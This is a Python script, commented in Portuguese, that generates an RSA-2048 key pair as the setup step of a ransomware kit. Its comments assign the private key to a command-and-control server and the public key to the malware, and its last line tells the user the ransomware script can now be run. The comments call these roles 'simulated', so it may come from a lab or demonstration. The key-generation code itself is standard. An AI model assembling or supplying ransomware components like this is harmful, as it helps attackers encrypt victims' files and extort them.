# Para instalar as dependências, execute: pip install cryptography
import os
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

# ----------------------------------------------------------------------
# ESTE SCRIPT GERA O PAR DE CHAVES ASSIMÉTRICAS RSA
# (CHAVE PRIVADA PARA O SERVIDOR C2 E CHAVE PÚBLICA PARA O MALWARE)
# ----------------------------------------------------------------------

CHAVE_PRIVADA_ARQUIVO = "private_key.pem"
CHAVE_PUBLICA_ARQUIVO = "public_key.pem"

def gerar_par_chaves_rsa():
    """Gera o par de chaves RSA-2048 e salva no disco."""
    print("Iniciando geração do par de chaves RSA-2048...")
    
    # 1. Geração da Chave Privada
    chave_privada = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )

    # 2. Serialização e Salvamento da Chave Privada (simulando C2 Server)
    chave_privada_pem = chave_privada.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        # A chave privada deve ser protegida com senha em um ambiente real
        encryption_algorithm=serialization.NoEncryption()
    )

    with open(CHAVE_PRIVADA_ARQUIVO, "wb") as f:
        f.write(chave_privada_pem)
    
    print(f"Chave Privada gerada e salva como '{CHAVE_PRIVADA_ARQUIVO}' (simulando servidor C2).")

    # 3. Extração, Serialização e Salvamento da Chave Pública (simulando Malware)
    chave_publica = chave_privada.public_key()
    chave_publica_pem = chave_publica.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )

    with open(CHAVE_PUBLICA_ARQUIVO, "wb") as f:
        f.write(chave_publica_pem)
        
    print(f"Chave Pública gerada e salva como '{CHAVE_PUBLICA_ARQUIVO}' (simulando malware).")
    print("\nExecução Concluída: Agora você pode rodar o script de ransomware.")

if __name__ == "__main__":
    gerar_par_chaves_rsa()